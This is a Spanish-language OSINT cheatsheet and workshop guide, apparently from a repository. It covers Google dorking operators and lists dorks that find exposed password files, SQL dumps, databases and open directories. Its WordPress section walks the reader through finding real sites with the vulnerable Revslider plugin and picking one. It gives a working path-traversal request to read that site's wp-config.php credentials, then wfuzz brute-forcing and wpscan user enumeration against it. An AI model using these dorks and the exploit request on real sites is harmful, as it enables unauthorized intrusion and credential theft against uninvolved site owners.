# OSINT


###  GOOGLE DORKING

# Google dork cheatsheet

## Filtros de Búsqueda
| Filter          | Description                                        | Example                              |
| :-------------- |:---------------------------------------------------| :------------------------------------|
| intext      | Busca las apariciones de todas las palabras clave dadas. | `intext:"keyword"` |
| inurl      | busca direcciones en Internet que tengan ese URL. | `inurl:"keyword"` |
| allinurl      | busca direcciones en Internet solamente las páginas que tengan ese URL. | `allinurl:"keyword"` |
| intitle      | busca páginas con ese título. | `intitle:"keyword"` |
| site      | busca un sitio (dominio) específico. | `site:"www.google.com"` |
| filetype      | especifica un tipo de extensión de archivo. | `filetype:"pdf"` |
| before/after      | Usado para buscar en un rango de fechas. | `filetype:pdf & (before:2000-01-01 after:2001-01-01)` |
| related      |Busca páginas que son “similares” a la página web especificada. | `related:www.google.com` |
| cache      | Muestra la versión de chache de alguna página. | `cache:www.google.com` |

## Ejemplos

#### Búsqueda de Dominios
```
site: www.microsoft.com
site: microsoft.com –www.microsoft.com 
```
#### Listados (Folder Trasversal)
```
intext:"index of /"
intitle: Index.of/admin
intitle: index.of apache server at
allintitle: "index of/root" 
```

#### Páginas por defecto (home page): 
```
intitle:test.page.for.apache "it worked"
allintitle:Netscape FastTrack Server Home Page
intitle:"Welcome to Windows 2000 Internet Services"
intitle:welcome.to.IIS.
allintitle:Welcome to Windows XP Server Internet Services
allintitle:"Welcome to Internet Information Server"
allintitle:Netscape Enterprise Server Home Page
allintitle:Netscape FASTTRACK Server Home Page 
```

#### Páginas por defecto: 
```
intitle:test.page.for.apache "it worked"
allintitle:Netscape FastTrack Server Home Page
intitle:"Welcome to Windows 2000 Internet Services"
intitle:welcome.to.IIS.
allintitle:Welcome to Windows XP Server Internet Services
allintitle:"Welcome to Internet Information Server"
allintitle:Netscape Enterprise Server Home Page
allintitle:Netscape FASTTRACK Server Home Page 
```
#### Manuales y Documentación
```
intitle:"documentation" intitle:”Apache 1.3 documentation”                     Apache 1.3
intitle: “Apache 2.0 documentation”                    Apache 2.0
intitle:”Apache HTTP Server” intitle:” documentation   Apache Various
inurl:cfdocs                                           ColdFusion
intitle:”Easerver” “Easerver Version Documents”        EAServer
inurl:iishelp core                                     IIS/Various
```
#### Páginas ejemplos
```
inurl:WebSphereSamples                            IBM Websphere
inurl:/sample/faqw46                              Lotus Domino 4.6
inurl:samples/Search/queryhit                     Microsoft Index Server
inurl:siteserver/docs                             Microsoft Site Server
inurl:/demo/sql/index.jsp                         Oracle Demos
inurl:demo/basic/info                             Oracle JSP Demos
inurl:iissamples                                  IIS/Various
inurl:/scripts/samples/search                     IIS/Various
```
#### Escaneo de Puertos
```
"VNC Desktop" inurl:5800
inurl:5800
inurl:webmin inurl:10000
```
#### Password
```
ext:pwd inurl:(service | authors | administrators | users) “# -FrontPage-”
inurl:"auth_user_file.txt"
"Index of /admin" 
"Index of /password"
"Index of /mail"
"Index of /" +passwd
"Index of /" +password.txt
"Index of /" +.htaccess
index of ftp +.mdb allinurl:/cgi-bin/ +mailto
alliurl:phpinfo.php
administrators.pwd.index
authors.pwd.index
service.pwd.index
filetype:sql “# dumping data for table” “`PASSWORD` varchar”
```

#### Base de Datos
```
intitle:index.of password.mdb
ext:asa mdb
ext:asa SERVER=(local)
index of ftp +.mdb allinurl:/cgi-bin/ +mailto
filetype:sql “# dumping data for table” “`PASSWORD` varchar”
```
## Operadores

#### Búsqueda de términos

Frase exacta

```
"Tinned Sandwiches"
```

#### OR

```
site:facebook.com | site:twitter.com
```

#### AND

```
site:facebook.com & site:twitter.com
```

#### Combinación de operadores

```
(site:facebook.com | site:twitter.com) & intext:"login"
(site:facebook.com | site:twitter.com) (intext:"login")
```

#### Excluir resultados

```
site:facebook.* -site:facebook.com
```

#### Patron Global (*)

```
site:*.com
```

###  DORKING EN WORDPRESS

Empezemos con este dork
```
Dork: inurl:/wp-content/plugins/revslider/
```
Dicho dork te permite ubicar sitios vulnerables en los que podrías obtener uno de los archivos de configuración principales del CMS, elija un sitio, a ese sitio que eligió para efectos del taller le llamaremos <www.vulnerable.com>
```
http://<www.vulnerable.com>/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
```

![image](https://user-images.githubusercontent.com/50930193/166059793-2dea6276-7bd7-445b-b59f-455bdb2c70b6.png)

Esto no es google DORKS pero es necesario que conozcan la funcionalidad de la técnica de Fuzzing, esta técnica permite automatizar mediante fuerza bruta la posibilidad de encontrar directorios, para ello es necesario disponer de un diccionario

Ingrese a kali y ejecute
```
$more /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Ese es un Wordlist con nombres de directorios que usan los principales servidorws web y CMSs

Ejecute el comando 
```
$ wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://<www.vulnerable.com>/FUZZ
```
![image](https://user-images.githubusercontent.com/50930193/166060739-d70d4a31-e673-4141-a637-ed456d009114.png)

Ahora ejecute el comando siguiente:
```
$ wpscan --url http://www.vulnerable.com --enumerate u
```
